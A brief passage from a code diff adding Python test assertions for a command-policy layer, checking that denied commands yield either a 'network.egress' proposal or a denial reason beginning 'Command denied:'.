+            assert proposal["operations"] == ["network.egress"], key
+        else:
+            assert context["denial_kind"] is None, key
+            assert context["proposal"] is None, key
+            assert str(context["reason"]).startswith("Command denied:"), key
 
 
 # The two table-driven denial texts the policy layer emits for unmodeled
